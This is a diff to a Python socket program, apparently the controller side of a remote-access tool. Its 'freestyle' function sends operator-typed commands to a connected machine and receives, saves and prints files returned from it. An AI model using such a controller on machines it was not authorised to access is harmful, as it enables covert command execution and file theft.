@@ -39,6 +39,7 @@ def freestyle(con):
                 current_size = 0
                 buffer = b""
 
+                # Fetch file content
                 try:
                     with open(filename, 'wb') as file:
                         while current_size < size:
@@ -57,6 +58,7 @@ def freestyle(con):
                     print(f"[{colored('*', 'red')}]Connection timed out.\n")
                     return False
 
+                # Print file content to screen
                 with open(filename, 'r') as file:
                     data = file.read()
                     print(data)
@@ -70,8 +72,46 @@ def freestyle(con):
                 con.send("cmd".encode())
                 cmd = input("CMD>")
                 con.send(cmd.encode())
+                time.sleep(1)
+                filename = con.recv(1024)
+                print(f"Filename: {filename}")
+                con.send("Filename OK".encode())
+
+                # Receive file
+                size = con.recv(4)
+                print(size)
+                size = bytes_to_number(size)
+                current_size = 0
+                buffer = b""
+
+                # Fetch file content
+                try:
+                    with open(filename, 'wb') as file:
+                        while current_size < size:
+                            data = con.recv(1024)
+                            if not data:
+                                break
+
+                            if len(data) + current_size > size:
+                                data = data[:size - current_size]
+
+                            buffer += data
+                            current_size += len(data)
+                            file.write(data)
+
+                except socket.error:
+                    print(f"[{colored('*', 'red')}]Connection timed out.\n")
+                    return False
+
+                # Print file content to screen
+                with open(filename, 'r') as file:
+                    data = file.read()
+                    print(data)
+
+                msg = "OK".encode()
+                con.send(msg)
                 ans = con.recv(1024).decode()
-                print(ans)
+                print(f"[{colored('V', 'green')}]{ans}")
 
             elif int(choice) == 0:
                 con.send("back".encode())
